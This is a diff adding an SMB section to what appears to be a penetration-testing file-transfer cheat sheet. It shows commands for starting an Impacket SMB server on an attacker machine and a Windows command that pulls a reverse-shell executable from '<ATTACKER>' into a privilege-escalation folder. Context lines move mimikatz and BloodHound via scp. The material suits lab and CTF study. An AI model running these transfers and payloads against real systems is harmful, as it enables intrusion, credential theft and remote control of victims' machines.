@@ -135,3 +135,16 @@ PS C:\User> scp C:\Temp\bloodhound.zip user@TARGET-IP:/tmp/bloodhound.zip
 
 -> Download:
 $ scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+SMB
+
+-> ATTACKER (without user:passwd)
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py <sharename> .
+
+-> ATTACKER (with user:passwd)
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username <username> -password password <sharename> .
+
+-> TARGET (Windows)
+copy \\<ATTACKER>\kali\reverse.exe C:\PrivEsc\reverse.exe
